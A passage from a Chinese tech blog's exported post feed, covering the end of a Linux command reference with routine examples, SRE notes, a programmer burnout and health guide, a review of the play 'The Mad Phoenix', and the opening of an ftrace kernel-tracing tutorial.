at a time.1$ cat [large-file] | more Mv分类：文件管理；移动The mv command lets you either move a file from one directory to another, or rename it.1$ mv test.txt /home/himanshu/Desktop/ Nice分类：进程管理；指定进程优先级The nice command lets you run a program with modified scheduling priority.123$ nice -n[niceness-value] [program]$ nice -n15 vim Nl分类：文件管理；输出行号The nl command writes contents of a file to output, and prepends each line with line number.1234$ nl file11 Hi2 How are you3 Bye Nm分类：文件管理The nm command is used to display symbols from object files. 12345678910111213141516171819$ nm test0804a020 B __bss_start0804841d T compare0804a020 b completed.65910804a018 D __data_start0804a018 W data_start08048360 t deregister_tm_clones080483d0 t __do_global_dtors_aux08049f0c t __do_global_dtors_aux_fini_array_entry0804a01c D __dso_handle08049f14 d _DYNAMIC0804a020 D _edata0804a024 B _end080484e4 T _fini080484f8 R _fp_hw080483f0 t frame_dummy......... Nproc分类：进程管理The nproc command displays the number of processing units available to the current process.12$ nproc1 Od分类：文件管理The od command lets you dump files in octal as well as some other formats.12345678910$ od /bin/ls0000000 042577 043114 000401 000001 000000 000000 000000 0000000000020 000002 000003 000001 000000 140101 004004 000064 0000000000040 122104 000001 000000 000000 000064 000040 000011 0000500000060 000034 000033 000006 000000 000064 000000 100064 0040040000100 100064 004004 000440 000000 000440 000000 000005 0000000000120 000004 000000 000003 000000 000524 000000 100524 004004......... Passwd分类：用户权限管理The passwd command is used for changing passwords for user accounts.123$ passwd himanshuChanging password for himanshu.(current) UNIX password: Paste分类：交互The paste command lets you merge lines of files. For example, if ‘file1’ contains the following lines:123456789101112131415$ cat file1HiMy name isHimanshuAroraIAmaLinux researcherand tutorialwriterThen the following &apos;paste&apos; command will join all the lines of the file:$ paste -s file1Hi My name is Himanshu Arora I Am a Linux researcher and tutorial writer Pidof分类：进程管理The pidof command gives you the process ID of a running program/process.12$ pidof nautilus2714 Ping分类：网络管理The ping command is used to check whether or not a system is up and responding. It sends ICMP ECHO_REQUEST to network hosts.12345$ ping howtoforge.comPING howtoforge.com (104.24.0.68) 56(84) bytes of data.64 bytes from 104.24.0.68: icmp_seq=1 ttl=58 time=47.3 ms64 bytes from 104.24.0.68: icmp_seq=2 ttl=58 time=51.9 ms64 bytes from 104.24.0.68: icmp_seq=3 ttl=58 time=57.4 ms Ps分类：进程管理The ps command displays information (in the form of a snapshot) about the currently active processes.1234$ psPID TTY TIME CMD4537 pts/1 00:00:00 bash20592 pts/1 00:00:00 ps Pstree分类：进程管理The pstree command produces information about running processes in the form of a tree.12345678$ pstreeinit???ModemManager???2*[&#123;ModemManager&#125;]??NetworkManager???dhclient? ??dnsmasq? ??3*[&#123;NetworkManager&#125;]??accounts-daemon???2*[&#123;accounts-daemon&#125;]??acpid??atop PwdThe pwd command displays the name of current/working directory.12$ pwd/home/himanshu Rm分类：文件管理The rm command lets you remove files and/or directories.1$ rm [file-name] Rmdir分类：文件管理The rmdir command allows you delete empty directories.1$ rmdir [dir-name] Scp分类：文件管理The scp command lets you securely copy files between systems on a network.1$ scp [name-and-path-of-file-to-transfer] [user]@[host]:[dest-path] Sdiff分类：文件管理；文本比对 side-by-sideThe sdiff command lets you perform a side-by-side merge of differences between two files.1$ sdiff file1 file2 Sed分类：文件管理;编程工具sed is basically a stream editor that allows users to perform basic text transformations on an input stream (a file or input from a pipeline).12$ echo &quot;Welcome to Howtoforge&quot; | sed -e &apos;s/Howtoforge/HowtoForge/g&apos;Welcome to HowtoForge Seq分类：计算器The seq commands prints numbers from FIRST to LAST, in steps of INCREMENT. For example, if FIRST is 1, LAST is 10, and INCREMENT is 2, then here’s the output this command produces: 123456$ seq 1 2 1013579 Sha1sum分类：计算器The sha1sum command is used to print or check SHA1 (160-bit) checksums.12$ sha1sum test.txt955e48dfc9256866b3e5138fcea5ea0406105e68 test.txt ShutdownThe shutdown command lets user shut the system in a safe way.1$ shutdown Size分类：文件管理The size command lists the section sizes as well as the total size for an object or archive file.123$ size testtext data bss dec hex filename1204 280 4 1488 5d0 test SleepThe sleep command lets user specify delay for a specified amount of time. You can use it to delay an operation like:1$ sleep 10; shutdown Sort分类：文件管理The sort command lets you sort lines of text files. For example, if ‘file2’ contains the following names:123456789101112$ cat file2zeuskyansamadamThen running the sort command produces the following output:$ sort file2adamkyansamzeus Split分类：文件管理The split command, as the name suggests, splits a file into fixed-size pieces. By default, files with name like xaa, xab, and xac are produced. $ split [file-name] Sshssh is basically OpenSSH SSH client. It provides secure encrypted communication between two untrusted hosts over an insecure network.1$ ssh [user-name]@[remote-server] Stat分类：文件管理The stat command displays status related to a file or a file-system.123456789$ stat test.txtFile: ‘test.txt’Size: 20 Blocks: 8 IO Block: 4096 regular fileDevice: 801h/2049d Inode: 284762 Links: 2Access: (0664/-rw-rw-r--) Uid: ( 0/ root) Gid: ( 0/ root)Access: 2017-03-03 12:41:27.791206947 +0530Modify: 2017-02-28 16:05:15.952472926 +0530Change: 2017-03-02 11:10:00.028548636 +0530Birth: - Strings分类：文件管理The strings command displays in output printable character sequences that are at least 4 characters long. For example, when a binary executable ‘test’ was passed as an argument to this command, following output was produced:1234567891011121314151617$ strings test/lib/ld-linux.so.2libc.so.6_IO_stdin_usedputs__libc_start_main__gmon_start__GLIBC_2.0PTRhQVhI[^_]EQUAL;*2$&quot;GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4............ Su分类：用户权限管理The su command lets you change user-identity. Mostly, this command is used to become root or superuser.1$ su [user-name] Sudo分类：用户权限管理The sudo command lets a permitted user run a command as another user (usually root or superuser).1$ sudo [command] Sum分类：文件管理The sum command prints checksum and block counts for each input file.12$ sum readme.txt45252 5 Tac分类：文件管理The tac command prints input files in reverse. Functionality-wise, it does the reverse of what the cat command does.12345678910$ cat file2zeuskyansamadam$ tac file2adamsamkyanzeus Tail分类：文件管理The tail command displays in output the last 10 lines of a file.1$ tail [file-name] Talk分类：网络管理The talk command lets users talk with each other.1$ talk [user-name] Tar分类：文件管理；压缩&amp;解压缩tar is an archiving utility that lets you create as well as extract archive files. For example, to create archive.tar from files ‘foo’ and ‘bar’, use the following command:123$ tar -cf archive.tar foo barMore... Tee分类：文件管理The tee command reads from standard input and write to standard output as well as files.1234$ uname | tee file2Linux$ cat file2Linux Test分类：计算器The test command checks file types and compare values. For example, you can use it in the following way:12$ test 7 -gt 5 &amp;&amp; echo &quot;true&quot;true Time分类：性能监测The time command is used to summarize system resource usage of a program. For example:12345678910$ time ping google.comPING google.com (216.58.220.206) 56(84) bytes of data.64 bytes from del01s08-in-f14.1e100.net (216.58.220.206): icmp_seq=1 ttl=52 time=44.2 ms^C--- google.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 44.288/44.288/44.288/0.000 msreal 0m0.676suser 0m0.000ssys 0m0.000s Top分类：系统信息；性能监测；性能概览。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;The top command gives a dynamic real-time view of a running system (in terms of its processes). For example:1$ top Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) 操作系统原理 | How Linux Works（三）：Memory Touch分类：文件管理The touch command lets you change file timestamps (the access and modification times). When name of a non-existent file is passed as an argument, that file gets created.1$ touch [file-name] Tr分类：文件管理The tr command can be used to translate/squeeze/delete characters. For example, here’s how you can use it to convert lowercase characters to uppercase:12$ echo &apos;howtoforge&apos; | tr &quot;[:lower:]&quot; &quot;[:upper:]&quot;HOWTOFORGE Tty分类：资源管理The tty command prints the filename of the terminal connected to standard input.12$ tty/dev/pts/10 Uname分类：用户权限管理The uname command prints certain system information.12$ uname -aLinux himanshu-desktop 4.4.0-62-generic #83~14.04.1-Ubuntu SMP Wed Jan 18 18:10:26 UTC 2017 i686 athlon i686 GNU/Linux Uniq分类：文件管理；待补充信息The Uniq command is used to report or omit repeated lines. For example, if ‘file2’ contains the following data:1234567891011$ cat file2Welcome to HowtoForgeWelcome to HowtoForgeA Linux tutorial websiteThanksThen you can use the uniq command to omit the repeated line.$ uniq file2Welcome to HowtoForgeA Linux tutorial websiteThanks Unexpand分类：文件管理；待补充信息The unexpand command converts spaces present in the input file(s) into tabs, and writes the file contents to standard output.1$ unexpand file1 Uptime分类：系统信息；性能监测；查看负载。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;The uptime command tells how long the system has been running.12$ uptime15:59:59 up 6:20, 4 users, load average: 0.81, 0.92, 0.82 Users分类：用户权限管理；待补充信息The users command displays in output the usernames of users currently logged in to the current host.12$ usershimanshu himanshu himanshu himanshu Vdir分类：文件管理；待补充信息The vdir command lists information about contents of a directory (current directory by default).12345$ vdirtotal 1088-rw-rw-r-- 1 himanshu himanshu 4850 May 20 2015 test_backup.pdf-rw-rw-r-- 1 himanshu himanshu 2082 May 28 2015 test-filled.pdf-rw-rw-r-- 1 himanshu himanshu 7101 May 28 2015 test.pdf Vim分类：编辑器vim is basically a text/programming editor. The name ‘vim’ stands for Vi IMproved as the editor is upwards compatible to the Vi editor.1$ vim [file-name] W分类：性能监测The w command displays information about the users currently on the machine, and their processes.1234567$ w16:18:07 up 6:39, 4 users, load average: 0.07, 0.32, 0.53USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAThimanshu :0 :0 09:39 ?xdm? 1:08m 0.25s init --userhimanshu pts/0 :0 09:41 6:36m 0.84s 7.84s gnome-terminalhimanshu pts/10 :0 14:51 0.00s 0.16s 0.00s whimanshu pts/11 :0 15:41 35:19 0.05s 0.05s bash Wall分类：通讯；待补充信息The wall command lets you write and send a message to other users that are currently logged in.1$ wall [your-message] Watch分类：性能监测The watch command can be used to monitor a program’s output. It runs the program repeatedly, displaying its output and errors. For example:1$ watch date Wc分类：文件管理；待补充信息The wc command prints newline, word, and byte counts for a file.12$ wc test.txt0 3 20 test.txt Whatis分类：帮助The whatis command displays single-line manual page descriptions.1234$ whatis mkdirmkdir (1) - make directoriesmkdir (2) - create a directorymkdir (1posix) - make directories Which分类：文件管理；以来The which command basically lets you locate a command - the file and the path of the file that gets executed. For example:12$ which date/bin/date Who分类：登录信息The who command shows who is logged on.12345$ whohimanshu :0 2017-03-03 09:39 (:0)himanshu pts/0 2017-03-03 09:41 (:0)himanshu pts/10 2017-03-03 14:51 (:0)himanshu pts/11 2017-03-03 15:41 (:0) Whereis分类：文件管理；以来The whereis command shows in output locations of the binary, source, and manual page files for a command.12$ whereis lsls: /bin/ls /usr/share/man/man1/ls.1posix.gz /usr/share/man/man1/ls.1.gz Whoami分类：登录信息The whoami command prints effective userid of the current user.12$ whoamihimanshu Xargs分类：编程工具The xargs command builds and executes command lines from standard input. In layman’s terms, it reads items from stdin and executes a command passed to it as an argument. For example, here’s how you can use xargs to find the word “Linux” in the files whose names are passed to it as input.12345678$ xargs grep &quot;Linux&quot;file1file2file3file1:Linux researcherfile2:A Linux tutorial websitefile3:Linux is opensourceMore... Yes分类：交互；确认The Yes command outputs a string repeatedly until killed.1$ yes [string] 扩展阅读电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SRE:Site Reliability Engineering]]></title>
    <url>%2F2017%2F04%2F26%2FSRE%2F</url>
    <content type="text"><![CDATA[摘要 SRE Workflow Code define Config 拜占庭将军问题 Workflow SREcon: Performance Checklists for SREs 2016 | Brendan Gregg’s Blog OS 造成的长时间非典型 JVM GC 停顿：深度分析和解决|庄振运 Discuss NASA:可以告知故障的机器COMSoL综合系统健康管理（Integrated System Health Management）软件的第一个版本于2003年在NASA艾姆斯研究中心（Ames Research Center）被开发出来，以此来监视一个试验型固液混合火箭发动机试车台。 腾讯数据中心:三大谷歌欧洲数据中心究竟如何做到100%自然冷却 ApplicationCode define Config SRE Team of Stack Overflow: DNSControl 分类：网络协议 Monitor beyond website monitoring the value of access logs Chris Jones:分布式共识系统Minghua Ye：App EngineMinghua Yescalable system automated service discovery google protocol buffer 消息协议，向后兼容 core lib c++ command-line flags Logging Googletest diff log diff filepages:blogs: 分布式共识系统CAP：无人值守的一致的高可用系统是不存在的CA系统：分区难题 脑裂 如何判断主从CP系统＋A：接受分区，在分区的情况下保持一致，牺牲一定损失 Zookeeper 拜占庭将军问题稳定状态需要 3N＋1（拜占庭式失败）或2N＋1（非拜占庭式失败）个实例。即多进程达到一致 单点故障源复制状态机（RSM），很久不动的冷备没有意义，风险更高。应用：分布式cron系统无状态微服务系统，先要有一个保障一致性（存储状态）的可靠服务。 扩展阅读：DevOps 漫谈系列 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 What is SRE (Site Reliability Engineering)? InfoQ:SRE是什么鬼 / 来自 Google DevOps 经验的落地实践]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IT 工程师养生指南]]></title>
    <url>%2F2017%2F04%2F21%2FHealth%2F</url>
    <content type="text"><![CDATA[摘要 《养生指南》 《嗑药简史》 This article is part of an Work Life Balance tutorial series. Make sure to check out my other articles as well: IT 工程师养生指南 医学常识| NIH 情绪健康检查单 为什么会产生倦怠？ “burnout is caused when you repeatedly make large amounts of sacrifice and or effort into high-risk problems that fail. ” 相比其他领域的专业人士，程序员似乎更经常出现倦怠（Burnout ）。目前没有明确的证据能够描述这种情况, 大致有以下四个主要原因： 第一，物理的（physical）。程序员每天坐在办公桌前的工作方式是不健康的, 它会让你感到更加昏昏欲睡。嗜睡也可能导致其他不那么好的习惯, 如白天吃零食, 沉迷兴奋剂, 熬夜等，导致身体损伤。第二，编程工作是认知高度集中和紧张的工作, 心理疲劳也可能会造成精神损伤。第三，也可能是因为你正在做的工作, 事实上,耗费心力而且吃力不讨好。解决这一问题的唯一办法就是在不考虑金钱为因素的情况下, 花点时间对你想从事的工作做一些反省。第四，当你作出大量牺牲,或努力解决高风险的问题, 但是反复失败时就会造成倦怠。在编程过程中往往伴随着运行失败，你的大脑容易将工作和失败联系在一起。 在工作中如何维持积极性，保持长久的生产力？下面介绍一些可行的技巧, 加以练习养成习惯后能够有效地延缓甚至消除倦怠。 基本套餐 It’s a simple but effective strategy for staying productive as a programmer while at the same getting some necessary break between the tasks. 吃好。 从小的方面开始, 比如喝苏打水;将低碳水化合物和蔬菜纳入饮食；少量多餐, 不要暴饮暴食。 睡好。 包括获得足够良好的睡眠。你有许多事情可以做, 例如创造一个更好的睡眠环境。一个秘诀是减少蓝光照射 — 可能会让你晚上熬夜。推荐软件：Flux 能随着一天的时间变化自动调整你电脑显示器屏幕的色温，过滤对人眼伤害最大的蓝光，从而尽可能减少屏幕对眼睛所带来的疲劳感并帮助提高睡眠质量。相应地，白天要多晒太阳。诱发睡眠的最重要的因素之一是你的身体自然分泌一种叫做褪黑素（Melatonin）的荷尔蒙。褪黑素是由你大脑中的松果体（pineal gland，位于脊椎动物脑中的小内分泌腺体，人体最小的器官）产生的, 它发出信号来调节身体中的睡眠-唤醒周期。阳光提供了天然的光谱, 我们需要配合褪黑素的生产周期。白天多点光线, 晚上少点光线, 一个神奇的睡眠公式。 不要过度劳累。 许多研究成果一再发现, 在这种情况下, 生产率(此处特指产出)在 4 个小时的专注工作之后就开始急剧下降。需要高度集中注意力的工作, 例如如长期的编程, 每天持续工作很长时间是不可能的。 番茄工作法（Pomodoro Technique，一种时间管理法方法，该方法使用一个定时器来分割出一个一般为25分钟的工作时间和5分钟的休息时间，而那些时间段被称为 pomodori，为意大利语单词 pomodoro “番茄” 的复数）。理想情况下, 休息时远离计算机，进行轻快的散步,做一些俯卧撑等。 Stay active, keep moving. 很多人对运动（exercise）有一种误解,认为锻炼必须包括去健身房等等。在现实中有很多保持活跃的方法，例如选择楼梯而不是电梯; 把车停在购物中心的街角停车点; 骑车去工作, 找到其他的方法将运动融入到你的日常生活中会让你感觉更好, 而不是整天卡在电脑前。 程序员增强套餐 戚继光：有精器而无精兵以用之，是谓徒费；有精兵而无精器以助之，是谓徒强。 尝试, 游戏, 学习, 实验原型（Experiment, play, learn, prototype）。 短期来看，只做你最擅长的事是高效和有利可图的。例如, 继续以重复的方式创建网站,。然而, 随着时间的推移, 它会变得无聊以及耗费精神。从工程的角度看，编程是使用行之有效的技术来生产软件的一个环节。同时它也关于乐趣, 实验和尝试新的想法。你可以特意将 20% 的时间用来游手好闲 — 这是避免倦怠的最有效的策略之一。游手好闲包括尝试新的类库, 创建一些有趣而不纯粹为了完成工作任务的东西, 或者从你的舒适区走出来、投资时间学习的东西, 例如函数式编程。 参加聚会、会议、订阅行业资讯。 编程会变得孤独。与其他开发者见面, 或者倾听他们在播客上的经验, 使你不仅仅只关注眼前的状况, 而是更关心你的工作。没有人喜欢抱怨, 但分享或倾听，与其他程序员交流, 例如倾听别人是如何克服困难的有助于舒缓情绪, 激励信心。 创造一个良好的工作环境并且不要吝啬投资你的工具(Invest in a good working environment and don’t be cheap on your tools ) 。 一台高配置的 PC 将编译得更快而不是让你将时间浪费在等待。请确保您有一个舒适的椅子, 桌子和良好设置的显示器。如果你在一个嘈杂的环境中工作, 可以投资高质量的耳机隔绝噪音使你保持安静。 Master your tools. 虽然有好的工具可以使编程过程更愉快, 熟练地掌握它们提高工作效率更加令人欣慰。了解工具的所有快捷方式, 即编辑器、OS、命令行, 每天都可以节省大量时间。如果能够将日常任务自动化，则可以让你更快地取得进步, 更进一步消除工作倦怠。 休息，保持对其它事物的激情。 除了编程之外, 还有许多有趣的活动。例如: 体育、文化活动、性、阅读、乐高、社交、钓鱼、烘焙咖啡、摄影等。如果你一直只做一件事, 比如编程, 总有一天你会不可避免地醒来 — 因为没有生命而憎恨自己。此外, 做一些看似与你的 “实际” 工作无关的事情, 可能会重新点燃你的激情, 激发新的想法, 就像理查德·费曼（著名物理学家，诺贝尔奖得主）在研究板块活动时一样。 考虑切换工作内容或启动不同的项目。 如果你当前被困在做无趣的、耗费精神工作上, 比如整天调整现有的代码库。或者你所从事的项目可能与你的兴趣或价值观不符。此外, 如果你发现编码不再能引起你的兴趣, 不妨看看其它相关的领域, 如信息系统架构（Information Architecture）, 系统管理（Systems Administration）等,可能会重新激发你的激情。 完成例行任务, 将那些你知道可以完成的内容纳入每日工作。诸如完成代码测试、写注释、改进变量命名等, 完成这些活动将释放内啡肽（神经递质，产生类似于吗啡一样的止痛效果和欣快感）。这是一个简短但非常有价值的提示, 这一过程使我们的大脑对我们的工作感到更加积极，非常有助于恢复工作能力。 扩展阅读 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（五）基于网络爬虫制作可视化图表 最佳写作实践：从Evernote到Ulysses 我的写作工具链 Kanban 看板管理实践精要 扩展阅读：嗑药简史嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)资源：美国农业部·食品成分数据库United States Department of AgricultureAgricultural Research ServiceUSDA Food Composition Databases 美国农业部·食品成分数据库 | USDA Food Composition Databases 参考文献 Preventing burnout for programmers Here’s 21 Tips To Get The Best Sleep Ever Which diet is best for long-term weight loss? 科学松鼠会：吃糖还是代糖？ 是什么吃胖了我们（3） 蛋白质 | 水白羊 是什么吃胖了我们（2） 脂肪 | 水白羊 是什么吃胖了我们（1） 碳水化合物 | 水白羊 节选《让我们害怕的食物——美国食品恐慌小史》 | 山寨盲流 TIME:You Asked: Should I Try a Fasting Diet? 果壳网|为什么今年的流感特别危险]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Health</tag>
        <tag>Science</tag>
        <tag>Medical</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[豪侠列传：南海十三郎(The Mad Phoenix)]]></title>
    <url>%2F2017%2F04%2F20%2FArtistic-The-Mad-Phoenix%2F</url>
    <content type="text"><![CDATA[摘要 不写剧评的观众不是好作家。 看戏也要讲缘分记得是小学还是初中的时候，我就在电影频道看过《南海十三郎》（1997拍摄，普通话），当时给我幼小的心灵以极大的震撼。后来到2009年左右，又在网上看过春天话剧社不知某年演出的现场录影版（粤语），更是如获至宝，之后几年好像看了大概二十几遍，越看越有味道。 今年偶然的机会了解到舞台剧版又要巡回演出了，本来打算看5月21日的深圳站，但是因为其它原因没有成行。但是不久之后，又看到了加演广州站的消息，于是早早的买了票，昨天晚上终于在现场看了一遍，也算是了了一桩十几年的夙愿，正所谓念念不忘，必有回响啊。 人物关系编剧：杜国威主演：谢君豪。年代背景：1920～1980 年代活动地域：广东南海县（今广州荔湾、佛山南海禅城）、上海、香港 南海十三郎：原型江誉镠，粤曲名编剧。薛觉先：原型薛觉先，粤曲名家，“粤剧伶王”，开创“薛派”。 唐涤生：原型唐涤生，粤曲名编剧，生于珠海唐家湾。代表作《落霞孤鹜》、《紫钗记》、《帝女花》、《蝶影红梨记》、《再世红梅记》。剧中与十三郎亦师亦友，皆是性情中人，对手戏精彩绝伦，不过二人的师徒关系，并无直接史料，为艺术加工。 太史公：十三郎之父。南海巨商、士绅，性豁达、好美食、好戏曲，喜结交各路人物，人称赛孟尝，娶了十二个老婆，子女众多。晚景凄凉，文革中批斗绝食而死。 梅仙：十三郎侄女。家道衰败、流落风尘，后来成为电影明星，与十三郎互有提携，中年重病早逝，逝前皈依宗教。 Lily：上海千金小姐，与十三郎是香港大学同学，舞会上一见倾心，从此牵绊一生。 任惜花：一个很烂的编剧，代表趋炎附势的世俗主义 马老大：一个很烂的戏曲演员、老板 痴情赢得是凄凉全场三个小时下来，观众基本上是一路爆笑下来的。但这确实是一部彻彻底底的悲剧，大悲剧。 第一悲：痴情无果，独钓寒江。 一见钟情的人有的是，痴情一生的人不多见。 心声泪影女儿香，燕归何处觅残塘。红绡夜盗寒江雪，痴人正是十三郎。 无论是真实的原型，还是剧中人物，无处安放的痴情都化成了剧作家笔下的作品。《寒江钓雪》、《心声泪影》、《梨香院》、《女儿香》、《梁红玉》、《燕归人未归》、《李香君》，哪一部不是有情有义，以情感人，哪一部不是剧作家滴血写成呢？ 第二悲：英才折损，浮萍无根。明面上，十三郎和唐涤生一对师徒，一个早逝，一个疯癫，盖世才华宛如流星，人生际遇无不令人唏嘘。暗地里，马老板、任惜花之流却总能如鱼得水、风生水起。 从南国到上海，从北疆到南国，落魄上海，冻死香港，风雨飘摇如浮萍，这就是大时代中的大多数。第三悲：家国破败，百年血泪。高门大院的太史第，高官显贵云集，英雄名角际会，蛇羹宴，丝竹局。不起眼的小舞台、小剧社，养活了一帮艺人，也养活了艺术。这些地方不仅有温情的记忆，更是滋养艺术家的沃土。 乱世动荡，府第凋零，舞台不存，也就到了曲终人散，各奔东西的时候了，旧主们只能哀吟“残山梦最真，旧境丢难掉。” 一旦天下承平，自然又会有新主大摆流水席，重现灯红酒绿。 壮怀如我更何人全剧写的都是离别情，绕不开的则是家国情怀。虽然出身士绅家庭，在儒家传统的浸染中成长，但是大时代无可避免的在十三郎身上留下烙印。五四运动以来，整个中国的知识阶层都或多或少地受到民族主义潮流的影响，这也就解释了后面的剧情，艺术创作上坚持大仁大义，抗战时期毅然去前线演出，流落香港时调侃讽刺英国总督等等。 本剧的高明之处又在于，主角虽然有浓烈的家国情怀，却始终和政治保持距离，基本上属于边缘中的边缘。这不正是大时代下小人物的真实处境吗？ 中国传统的知识分子，多少都有点以天下为己任的调调，但是鲜有几个人能真的有携天下而行豪气，鲜有几个人能做到视金钱如粪土。且不论有几人可以真的混进体制内，就算是谋得红顶乌纱，也多是为稻梁谋，不倾轧害人已是难得，遑论有所作为。 但愿梦来不必醒本剧从始至终，其实隐含着很多处宿命论的调子。例如天才要么早逝、要么疯癫的偈语，三哥浪荡公子、侄女沦落风尘的设定，老揸以声成名、晚年却破声的无奈…… 同时，主角在最潦倒之时，依然高举反宗教主义的大旗的。通过这条线索，编剧再次丰富了十三郎的思想内涵：即使是在极端恶劣的生存条件下面， 他并不会屈从于任何权威（这方面如果对于文革史稍有留意的话能更好理解），或者这就是杜国威希望能与“全港编剧共勉”的东西，十三郎不仅具有极高的艺术造诣和品味（对马老板、任惜花之流的极端鄙视），还有自己的一套完整信仰体系，一家价值评判标准，是一个完全独立自由、大写的人。 这一点，通过梅仙的对比，显得更有张力，大多数剧评人并没有关注到。 由于从小缺乏教育、也极度缺乏家庭温情，人生际遇也多是在灯红酒绿的浮夸世界，梅仙是没有机会、也没有意识要去构建自己的心灵世界的。所以，当她不再受宠、远离闪光灯，远离众人的殷勤、独自面对疾病和自己的时候，投入宗教的怀抱，成为无比虔诚的基督徒，也是顺理成章的事。现在大部分的演艺界人士不就喜欢结交仁波切吗？这其实无关智商，越是灯红酒绿的地方，越需要宗教关怀，古今皆然。 总之，十三郎的下半生基本上在疯癫中度过，还好“疯得够清醒”。你说是避世也好，自我麻醉也好，还不如说是自我保护。自我放逐于江湖，远离浊世，远离浊世的人和事，那些积极入世之徒，又有几个能永保赤子之心，他至少可以怀抱“雪上白凤凰”，自己干净。 新版舞台剧的不足1.一见倾心过于单薄从比重上看，十三郎与Lily的感情戏偏少，上来就一见钟情，处理得太简单，起承转折的节奏也把握得比较零散，过于突兀。这块虽然大体上继承了原版舞台剧、97电影版的底子，但是总感觉这一版的处理不好。也许是我不大喜欢这一版的Lily，呵呵。 2.薛觉先的扮演者早先看的现场录影版，薛觉先这个角色的印象很深，到后来才知道，表演者是真正的粤剧演员，印象中已经去世了，可惜！ 现在这个版本的扮演者，总体感觉阳刚有余，柔性不足，整体表情偏硬，形象上不似伶人，几段关键的唱腔的味道都不大对。 3.龙套服装设计这部舞台剧中的一众龙套其实非常重要，不仅作为“说书人”的角色承上启下，而且还担纲其它多个配角。但是感觉这个版本的服装，设计感觉不太好，一是色调偏暗，二是用了多个色块拼接、感觉花哨，总之是另外比较奇怪。 总评个人认为，《南海十三郎》是自昆曲《桃花扇》、小说《红楼梦》以降，以离情写兴亡的惊世之作。限于体裁、篇幅以及语言的关系，虽偏于小众，仍不可忽视作品本身承载的人性关怀和世界格局。 二十几年150多场演出就要划上一个休止符了，希望以后也有好的作品能书写我们这个时代的故事。 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 相关阅读电子书：《香山艺术评论》]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术(三) ：Tracing your kernel Functions!]]></title>
    <url>%2F2017%2F04%2F17%2FDTrace_FTrace%2F</url>
    <content type="text"><![CDATA[摘要Ftrace 是一个设计用来帮助开发者和设计者监视内核的追踪器，可用于调试或分析延迟以及性能问题。ftrace 令人印象最深刻的是作为一个 function tracer，内核函数调用、耗时等情况一览无余。另外，ftrace 最常见的用途是事件追踪，通过内核是成百上千的静态事件点，看到系统内核的哪些部分在运行。实际上，ftrace 更是一个追踪框架，它具备丰富工具集：延迟跟踪检查、何时发生中断、任务的启用、禁用及抢占等。在 ftrace 的基线版本之上，还有很多第三方提供的开源工具，用于简化操作或者提供数据可视化等扩展应用。 一、IntroductionDeveloper(s): Steven Rostedt(RedHat) and othersInitial release: October 9, 2008;Operating system: Linux （merged into the Linux kernel mainline in kernel version 2.6.27）Type: Kernel extensionLicense: GNU GPLWebsite: www.kernel.org/doc/Documentation/trace 二、ABC在使用ftrace之前，需要确认调试目录是否已经挂载，默认目录：/sys/kernel/debug/ 。 debugfs是Linux内核中一种特殊的文件系统，非常易用、基于RAM，专门设计用于调试。（since version 2.6.10-rc3，https://en.wikipedia.org/wiki/Debugfs)。 1234mount -t debugfs none /sys/kernel/debug或者指定到自己的目录mkdir /debugmount -t debugfs nodev /debug 挂载之后会自动创建如下文件：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/sys/kernel/debug# ls -lrtdrwxr-xr-x. 2 root root 0 